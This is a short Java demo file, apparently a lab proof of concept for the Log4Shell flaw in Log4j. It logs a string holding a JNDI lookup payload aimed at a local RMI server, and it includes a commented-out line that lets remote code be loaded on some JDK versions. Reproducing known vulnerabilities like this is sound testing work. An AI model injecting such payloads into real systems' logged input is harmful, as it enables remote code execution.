package com.lahmxu;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Demo {
    private static final Logger log = LogManager.getLogger();

    public static void main(String[] args) {
        //部分需要这个 看jdk版本
//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        String userName = "${jndi:rmi://127.0.0.1:1099/test}";
        log.info("userName: {}", userName);
    }
}
